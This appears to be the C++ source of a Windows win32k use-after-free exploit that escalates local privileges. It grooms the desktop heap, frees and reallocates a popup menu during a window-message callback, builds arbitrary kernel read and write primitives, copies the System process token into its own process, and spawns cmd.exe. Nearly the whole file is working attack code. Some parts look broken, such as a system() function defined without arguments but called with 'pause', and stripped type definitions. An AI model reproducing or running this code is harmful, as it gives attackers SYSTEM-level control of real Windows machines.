#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#define WM_NCUAHDRAWCAPTION 0x00AE

#define CMIALIGN(x,n) (size_t)((~(n-1))&((x)+(n-1)))
#define SHIFT(x, n) ((PBYTE)(x) + n)

/**
 *  Removed
 */

typedef PTHRDESKHEAD(NTAPI *ty_pfnHMValidateHandle)(PVOID h, int type);

ty_pfnHMValidateHandle find_HMValidateHandle() {
    HMODULE hUser32 = LoadLibrary(L"User32.dll");
    if (NULL == hUser32) {
        wprintf(L"user32 not found\n");
        return NULL;
    }
    PBYTE pbIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
    if (NULL == pbIsMenu) {
        wprintf(L"IsMenu() not found\n");
        return NULL;
    }

    ty_pfnHMValidateHandle pfnHMValidateHandle = NULL;
    for(PBYTE i = pbIsMenu; i < (pbIsMenu + 0x1000); i++) {
        if (*i == 0xe8) {
            pfnHMValidateHandle = (ty_pfnHMValidateHandle)(i + 5 + (int)(*(DWORD*)(i + 1)));
            break;
        }
    }

    return pfnHMValidateHandle;
};

/**
 *  
 *  Global Vars
 */

const UINT g_wID = 0xF010;
const SIZE_T g_szWindow = 0x168;
const SIZE_T g_szFiller = 0x248;
const SIZE_T g_szCls = 0x1a0;

const wchar_t g_fmt[] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@%04d";

const SIZE_T g_cntWindowArrFill = 0x150;
const SIZE_T g_cntMenuArrFill = 0x250;

HWND  g_hWindowArrFill[g_cntWindowArrFill] = {NULL};
HMENU g_hMenuArrFill[g_cntMenuArrFill] = {NULL};
PVOID g_kpPopupMenu_A = NULL;
HMENU g_hPopupMenu_A = NULL;
HMENU g_hMenu_Top = NULL;

ty_pfnHMValidateHandle g_pfnHMValidateHandle = nullptr;
ExploitState           g_exploitState;
BYTE                   g_spwndParent[0x200] = {0};
BYTE                   g_spmenu[0x100] = {0};
BYTE                   g_cls[0x1000] = {0};

int system()
{
    SECURITY_ATTRIBUTES     sa;
    HANDLE                  hRead, hWrite;
    byte                    buf[40960] = { 0 };
    STARTUPINFOW            si;
    PROCESS_INFORMATION     pi;
    DWORD                   bytesRead;
    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&sa, sizeof(sa));
    int br = 0;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        printf("[!][system] CreatePipe(): Failed with %llx\n", GetLastError());
        return -3;
    }

    si.cb = sizeof(STARTUPINFO);
    GetStartupInfoW(&si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.lpDesktop = L"WinSta0\\Default";
    wchar_t cmd[4096] = { L"cmd.exe" };

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        printf("[!][system] CreateProcessW(): Failed with %llx\n", GetLastError());
        return -2;
    }
    CloseHandle(hWrite);

}

PVOID Read64(PVOID address) {
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);
    ptr_My_tagMENU spmenu = (ptr_My_tagMENU)g_spmenu;

    spmenu->cItems = 1;
    spmenu->cAllocated = 1;
    spmenu->cxMenu = 1;
    spmenu->cyMenu = 1;
    spmenu->rgItems = SHIFT(address, -0x40); // sizeof tagMenuItem for tested version of OS Windows is 0x90
                                             // formulas inside win32kful!xxxGetMenuBarInfo are folowing
                                             // mov     ecx, dword ptr [r8+rdx*8-50h] 
                                             // add     ecx, dword ptr [r8+rdx*8-48h]
                                             // where r8 is our address
                                             // and rdx*8 it is total offset from begin of rgItems to requested menu item
                                             // that means the low dword part will be read from 0x40 and high part from 0x48  
    
    GetMenuBarInfo(g_exploitState.hRightGuard, OBJID_MENU, 1, &mbi);

    return PVOID((unsigned int)mbi.rcBar.left + ((ULONGLONG)mbi.rcBar.top << 32));
};

PVOID Write64(PVOID address, ULONG64 value, bool& fStatus) {
    ptr_My_tagCLS pcls = (ptr_My_tagCLS)g_cls;

    fStatus = false;

    pcls->cbclsExtra = 0xFFFFFFFF;
    pcls->pclsBase = (PVOID)&g_cls[0];
    pcls->pclsClone = SHIFT(address, -0xA0);

    int n = 8;
    int o = 0;
    PVOID pnext = Read64(pcls->pclsClone);
    while(pnext != 0 && n > 0 ) {
        o += 8;
        pcls->pclsClone = SHIFT(pcls->pclsClone, -8);
        pnext = Read64(pcls->pclsClone);
        n--;
    }

    if (n == 0){
        fStatus = false;
        return NULL;
    }

    ULONG_PTR origcls = SetClassLongPtr(g_exploitState.hwndm, 0x248, (LONG_PTR)&g_cls[0]);
    ULONG_PTR prev = SetClassLongPtr(g_exploitState.hRightGuard, o, value);
    SetClassLongPtr(g_exploitState.hwndm, 0x248, origcls);
    
    fStatus = true;
    return (PVOID)prev;
}

void prepareHeap() {
    /**
    * We would like to build some "fence" in heap which will consist of 
    * tagCLS. Each free tagCLS is a seat for allocated target tagMENU.
    * 
    * (folowing ASCII depict desired memory layout)
    * |------|-------------------------|------|
    * |tagCLS|seat for tagMENU (victim)|tagCLS|
    * |------|-------------------------|------|
    *    0               1                2
    * number of tagCLS deduced from practice
    * 
    * odd indices of tagCLS is the seat
    * even indices of tagCLS is the fence
    * 
    * order is important becuse we dont want to triger coalesce process in RtlpFree
    * 
    * size of tagCLS with cbClsExtra == 0 is 0xA0 bytes. Size of tagMENU is 0x98 but it will be aligned by RtlpAllocateHeap
    * to 16 bound. That means tagMENU allocation size is 0xA0 bytes.
    * 
    */
    const wchar_t g_fmt[] = L"@%d";
    for (int i = 0 ; i < 32; i++) {
        WCHAR   szTemp[0x100] = { 0 };
        wsprintf(szTemp, g_fmt, i);

        WNDCLASSEX wc = { 0 };
        wc.cbClsExtra = 0x0; 
        wc.lpszClassName = szTemp;
        wc.cbSize = sizeof(WNDCLASSEXA);
        wc.lpfnWndProc = DefWindowProcW;
        wc.lpszMenuName = NULL;
        wc.hInstance = GetModuleHandleA(NULL);

        RegisterClassExW(&wc);
    }

    for (int i = 0 ; i < 32; i++) {
        WCHAR szTemp[0x100] = { 0 };
        wsprintf(szTemp, g_fmt, i);
        if (i % 2)
            UnregisterClassW(szTemp, GetModuleHandleA(NULL));
    }
}

void reallocMenu() {
    for (int i = 0; i < 32; i++) {
        WCHAR   szTemp[0x100] = { 0 };
        wsprintf(szTemp, g_fmt, i);

        /**
         * What strings are we going to generate here ?
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0000 (wnd => 0x303030)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0001 (wnd => 0x313030)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0011 (wnd => 0x313130)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0012 (wnd => 0x313230)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0002 (wnd => 0x323030)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0022 (wnd => 0x323230)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0003 (wnd => 0x333030)
         *  ...
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0015 (wnd => 0x353130)
         *  ...
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0031 (wnd => 0x313330)
         * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@0032 (wnd => 0x323330)
         */

        WNDCLASSEX wc = { 0 };
        /**
         * We increases total size of tagCLS to move corresponded allocation size to another next alignment section.
         * It prevents occuping of prepared seats. We left them for CLSNAME.  
         * */
        wc.cbClsExtra = 0x30; 
        /**
         * We replaces victim tagMENU with tagCLS.lpszClassName. 
         * szTemp has size of 0x98 (75 wchars + null term == 76 wchars, 
         * 76 wchars * 2 == 0x98 bytes which will be alligned to 0xA0) 
         */
        wc.lpszClassName = szTemp;
        wc.cbSize = sizeof(WNDCLASSEXA);
        wc.lpfnWndProc = DefWindowProcW;
        wc.lpszMenuName = NULL;
        wc.hInstance = GetModuleHandleA(NULL);

        RegisterClassExW(&wc);
    }
}

int exploit() {
    // we use OOB write to overwrite RightGuard.spmenu field
    // +0x1A0 sizeof targetTagCLS
    // +0xC0 offset to spmenu field
    SetLastError(0);
    LONG_PTR result = SetClassLongPtr(g_exploitState.hwndm, 0x270, (LONG_PTR)&g_spmenu[0]);
    if (result == NULL && GetLastError() != ERROR_SUCCESS) {
        wprintf(L"[~][exploit] SetClassLongPtr() Failed with %d", GetLastError());
        return -1;
    }
    // we read RightGuard window ThreadInfo
    // +0x250 sizeof targetTagCls
    // +0Ñ…10  offset to TI field
    PVOID p = Read64(SHIFT(g_exploitState.kptagCls, 0x260));
    wprintf(L"[+][exploit] -> RGW.ti=%llx\n", p);
    
    // ETHREAD
    p = Read64(p);
    if (!p) {
        wprintf(L"[~][exploit] Reading ETHREAD was failed\n");
        return 1;
    }
    wprintf(L"[+][exploit] -> ETHREAD=%llx\n", p);
    PVOID eprocess = Read64(SHIFT(p, 0x220));
    if (!eprocess) {
        wprintf(L"[~][exploit] Reading EPROCESS was failed\n");
        return 1;
    }
    wprintf(L"[+][exploit] -> EPROCESS=%llx\n", eprocess);
    p = Read64(SHIFT(eprocess, 0x2f0));
    if (!p) {
        wprintf(L"[~][exploit] Reading of EPROCESS.ActiveProcessLinks failed\n");
        return 1;
    }
    do {
        p = Read64(SHIFT(p, 0x08));
        if (!p) {
            wprintf(L"[~][exploit] Reading of EPROCESS.ActiveProcessLinks.BLink failed\n");
            return 1;
        }
        ULONG64 pid = (ULONG64)Read64(SHIFT(p, -0x08));
        if (!pid) {
            wprintf(L"[~][exploit] Reading of EPROCESS.Pid failed\n");
            return 1;
        }
        if (pid == 4) {
            PVOID pSystemToken = Read64(SHIFT(p, 0x68));
            if (!pSystemToken) {
                wprintf(L"[~][exploit] Reading of EPROCESS.pSystemToken failed\n");
                return 1;
            }
            printf("[+][exploit] -> pSystemToken=%llx \n", pSystemToken);
            
            bool fSetTokenStatus = false;
            Write64(SHIFT(eprocess, 0x358), (ULONG64)pSystemToken, fSetTokenStatus);
            if (!fSetTokenStatus) {
                printf("[+][exploit] ->  Write64(): Failed \n", pSystemToken);
                return 1;
            }

            break;
        }
    } while (p != eprocess);
    
    // recover back spmenu
    result = SetClassLongPtr(g_exploitState.hwndm, 0x270, (LONG_PTR)NULL);

    return 0;
};  

void initfake(PVOID base, PVOID menu, PVOID target) {
    PVOID menuState = SHIFT(base, sizeof(My_tagTHREADINFO));
    PVOID popupMenu = SHIFT(menuState, sizeof(My_tagMENUSTATE));

    ptr_My_tagTHREADINFO fake_threadInfo = (ptr_My_tagTHREADINFO)base;
    fake_threadInfo->pMenuState = menuState;

    ptr_My_tagMENUSTATE fake_menuState = (ptr_My_tagMENUSTATE)menuState;

    fake_menuState->fFlags = 0x04; // fInsideMenuLoop value for condition in win32kfull!MNGetPopupFromMenu
    fake_menuState->pGlobalPopupMenu = popupMenu;
    fake_menuState->field_60 = 0; // fast exit from win32kfull!MNAnimate

    ptr_My_tagPOPUPMENU fake_popupmenu = (ptr_My_tagPOPUPMENU)popupMenu;
    fake_popupmenu->spmenu = menu;
    fake_popupmenu->spwndPopupMenu = target;
}

void setupfake(HMENU hMenu) {
    
    PVOID menu = g_pfnHMValidateHandle(hMenu, 2)->pSelf;

    wprintf(L"[?][setupfake] kpmenu=%llx\n", menu);

    PVOID umptr = VirtualAlloc((PVOID)0x300000, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memset(umptr, 0x41, 0x100000);

    /**
     * Here we craft our fake structures
     */
    PVOID fakebase = (PVOID)0x303030;
    for (int i = 0; i < 32; i++){
        // here we allocate block for fake structure for each tagCLS reallocation
        PVOID umti = VirtualAlloc(
            NULL,
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        // fill data at destination addresses (tagCLS:NAME + 0x48)
        PVOID base = SHIFT(fakebase, ((i % 10) * 0x10000) + (i / 9) * 0x100);
    
        wprintf(L"[?][setupfake] base=%llx\n", (ULONGLONG)base);

        ptr_My_tagWND fake_tagWND = (ptr_My_tagWND)base;
        fake_tagWND->pti = umti;

        //-0x120 field offset
        // 0x60 tagcls offset
        // but we moved it on 3 bytes
        // to change the most significant 
        // byte in cbClsExtra field
        initfake(
            umti,
            menu,
            SHIFT(SHIFT(g_exploitState.kptagCls, 0x63), -0x120)
        );
    }
};

void initprimitive() {
    const int allocationsCount = 0x100;

    HWND twindows[allocationsCount] = {0}; 
    
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = DefWindowProc;
    wc.lpszClassName = L"WindowClass#1";
    wc.cbWndExtra = 0xe0;
    RegisterClass(&wc);

    for (int i = 0; i < allocationsCount; i++) {
        twindows[i] = CreateWindow(wc.lpszClassName, NULL, NULL, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    }

    HWND hMiddle = NULL;
    for (int i = 1; i < allocationsCount - 1; i++) {
        HWND pj = twindows[i - 1];
        HWND j = twindows[i];
        HWND nj = twindows[i + 1];

        PTHRDESKHEAD kptrpj = g_pfnHMValidateHandle(pj, 1);
        PTHRDESKHEAD kptrj = g_pfnHMValidateHandle(j, 1);
        PTHRDESKHEAD kptrnj = g_pfnHMValidateHandle(nj, 1);
        
        ULONGLONG ndiff = abs((LONGLONG)kptrj->pSelf - (LONGLONG)kptrnj->pSelf);
        ULONGLONG pdiff = abs((LONGLONG)kptrpj->pSelf - (LONGLONG)kptrj->pSelf);

        wprintf(L"[?][initprimitive] j=%llx nj=%llx pj=%llx ndiff=%llx pdiff=%llx \n", (ULONGLONG)kptrj->pSelf, (ULONGLONG)kptrnj->pSelf, (ULONGLONG)kptrpj->pSelf, ndiff, pdiff);

        if (pdiff == 0x250 && ndiff == 0x250) {
           hMiddle = j;

           // save primitive setup
           g_exploitState.hLeftGuard = pj;
           g_exploitState.hRightGuard = nj;
           g_exploitState.kptagCls = kptrj->pSelf;
           break;
        }
    }

    if (hMiddle == NULL)
        return;

    DestroyWindow(hMiddle);

    WNDCLASSEXW targetWC = { 0 };
    targetWC.lpfnWndProc = DefWindowProc;
    targetWC.lpszClassName = L"WindowClass#2";
    targetWC.cbClsExtra = 0x1a0;
    targetWC.cbSize = sizeof(WNDCLASSEXA);
    targetWC.lpfnWndProc = DefWindowProcW;
    targetWC.hInstance = GetModuleHandleA(NULL);

    RegisterClassExW(&targetWC);

    for (int i = 0; i < allocationsCount; i++) {
        if (twindows[i] == g_exploitState.hLeftGuard || twindows[i] == g_exploitState.hRightGuard)
            continue;

        DestroyWindow(twindows[i]);
    }

    // set constants in extra data array of LeftGuard Window
    
    // first sets field_37 of tagWND inside extra data array of LeftGuard Window
    // it is checked in win32kfull!xxxRedrawWindow
    SetLastError(0);
    LONG_PTR result = SetWindowLongPtr(g_exploitState.hLeftGuard, 0x62, 0x1111111122222210);
    if (!result && GetLastError() != ERROR_SUCCESS) {
        wprintf(L"[!][initprimitive] SetWindowLongPtr(0x5a): Failed with %d\n", GetLastError());
    }

    // second sets field_42 of tagWND inside extra data array of LeftGuard Window
    // it is checked in win32kfull!xxxRedrawWindow
    SetLastError(0);
    result = SetWindowLongPtr(g_exploitState.hLeftGuard, 0x6d, 0x29d);
    if (!result && GetLastError() != ERROR_SUCCESS) {
        wprintf(L"[!][initprimitive] SetWindowLongPtr(0x6d): Failed with %d\n", GetLastError());
    }

    // third sets field_32 of tagWND inside extra data array of LeftGuard Window
    // it is checked in win32kfull!xxxRedrawWindow
    SetLastError(0);
    result = SetWindowLong(g_exploitState.hLeftGuard, 0x5d, 0x8);
    if (!result && GetLastError() != ERROR_SUCCESS) {
        wprintf(L"[!][initprimitive] SetWindowLongPtr(0x6d): Failed with %d\n", GetLastError());
    }

    // fourth sets spwndParent of tagWND inside extra data array of LeftGuard Window
    // it is checked in win32kfull!xxxRedrawWindow
    // it prevents from crash inside InternalInvalidate2
    SetLastError(0);
    result = SetWindowLongPtr(g_exploitState.hLeftGuard, 0x83, (LONG_PTR)&g_spwndParent[0]);
    if (!result && GetLastError() != ERROR_SUCCESS) {
        wprintf(L"[!][initprimitive] SetWindowLongPtr(0x6d): Failed with %d\n", GetLastError());
    }

    // we need additional window bind to target tagCls for OOB write
    // SetClassLongPtr() requires the HWND
    g_exploitState.hwndm = CreateWindow(targetWC.lpszClassName, NULL, NULL, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg) {
        case WM_NCUAHDRAWCAPTION: {
            
            wprintf(L"[?] wndproc: msg=WM_NCUAHDRAWCAPTION wParam=%x lParam=%x\n", wParam, lParam);

            for (int i = GetMenuItemCount(g_hMenu_Top) - 1; i >= 0; i--) {
                RemoveMenu(g_hMenu_Top, i, MF_BYPOSITION);
            }
            wprintf(L"[+] 5. Destroy Menu\n");
            system("pause");

            DestroyMenu(g_hPopupMenu_A); // Here MenuA will be freed
            wprintf(L"[+] 6. Destroyed\n");

            system("pause");
            reallocMenu();
            wprintf(L"[+] 6. Reallocated \n");
            system("pause");

            break;
        }
    }

    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[])
{ 
    wprintf(L"[?][main] PID=%x\n", GetCurrentProcessId());
    wprintf(L"[?][main] TID=%x\n", GetCurrentThreadId());
    system("pause");

    g_pfnHMValidateHandle = find_HMValidateHandle();

    wprintf(L"[+][main] init RW primitive: STARTED\n");
    ZeroMemory(&g_exploitState, sizeof(ExploitState));
    initprimitive();
    if (g_exploitState.kptagCls == NULL) {
        wprintf(L"[!][main] Failed to make primitive :-(\n");
        return -1;
    }

    wprintf(L"[+][main] init RW primitive: OK\n");
    wprintf(L"[+][main]   -> LGW=%llx\n", g_exploitState.hLeftGuard);
    wprintf(L"[+][main]   -> RGW=%llx\n", g_exploitState.hRightGuard);
    wprintf(L"[+][main]   -> kptagCls=%llx\n", g_exploitState.kptagCls);

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = wndproc;
    wc.lpszClassName = L"NormalClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 300, 100, NULL, NULL, NULL, NULL);
    if (NULL == hwnd) {
        wprintf(L"[~][main] CreateWindowExW(): Failed with %d\n", GetLastError());
        return -2;
    }

    HMENU hSystemMenu = GetSystemMenu(hwnd, FALSE);
    if (NULL == DeleteMenu(hSystemMenu, g_wID, MF_BYCOMMAND))
    {
        wprintf(L"[~][main] DeleteMenu(): Failed with %d\n", GetLastError());
        return -2;
    }

    g_hMenu_Top = CreateMenu();
    if (NULL == g_hMenu_Top) {
        wprintf(L"[~][main] CreateMenu(): Failed with %d\n", GetLastError());
        return -3;
    }

    wprintf(L"[+][main] prepare win32k desktop heap: STARTED\n");
    system("pause");

    prepareHeap();

    wprintf(L"[+][main] prepare win32k desktop heap: OK\n");
    system("pause");

    g_hPopupMenu_A = CreatePopupMenu();
    if (NULL == g_hPopupMenu_A) {
        wprintf(L"[~][main] CreatePopupMenu(A): Failed with %d\n", GetLastError());
        return -4;
    }

    wprintf(L"[+][main] setupfake structures: STARTED\n");
    setupfake(g_hPopupMenu_A);
    wprintf(L"[+][main] setupfake structures: OK\n");

    /*
        |---------|
        | SysMenu | <---- It gives us ability to callback inside xxxRedrawTitle
        |---------|
             |
             |
             ------>|---------|
                    |  Top    |
                    |---------|
                        |
                        |   |---------|
                        --->|  MenuA  | <----- UAF Target
                            |---------|
                                |
                                |
                                ------>|--------------|
                                |      |  MenuB_Item1 |
                                |      |--------------|
                                |      |--------------|
                                ------>|  MenuB_Item2 | <---- Has system wID
                                       |--------------|
    
    */

    AppendMenu(g_hPopupMenu_A, MF_STRING, (UINT_PTR)0x901, L"MenuB_Item1");
    AppendMenu(g_hPopupMenu_A, MF_STRING, (UINT_PTR)g_wID, L"MenuB_Item2");

    AppendMenu(g_hMenu_Top, MF_POPUP, (UINT_PTR)g_hPopupMenu_A, L"MenuA");
    AppendMenu(hSystemMenu, MF_POPUP, (UINT_PTR)g_hMenu_Top, L"Top");

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    wprintf(L"[?][main] hwnd=%llx\n", hwnd);
    wprintf(L"[?][main] hmenu=%llx\n", g_hMenu_Top);
    wprintf(L"[?][main] hsysmenu=%llx\n", hSystemMenu);
    wprintf(L"[?][main] hpopupmenu(A)=%llx\n", g_hPopupMenu_A);

    wprintf(L"[+][main] --> win32kfull!xxxEnableMenuItem() <-- \n");
    system("pause");

    EnableMenuItem(hSystemMenu, g_wID, MF_DISABLED);

    exploit();
    system();

    MSG msg = { 0 };

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}